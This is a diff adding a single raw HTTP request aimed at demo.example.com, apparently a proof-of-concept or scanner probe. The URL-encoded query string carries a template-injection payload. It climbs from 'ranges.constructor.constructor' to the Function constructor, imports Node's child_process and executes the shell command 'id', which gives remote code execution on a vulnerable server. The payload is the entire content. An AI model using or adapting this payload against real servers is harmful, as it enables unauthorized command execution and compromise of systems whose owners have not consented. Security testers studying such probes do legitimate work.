@@ -1,0 +1,4 @@
+GET /a?s=%7B%7B%2Branges.constructor.constructor%28%22return%2Bimport%22%29%28%29%28%27child_process%27%29.exec%28%27id%27%29%2B%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
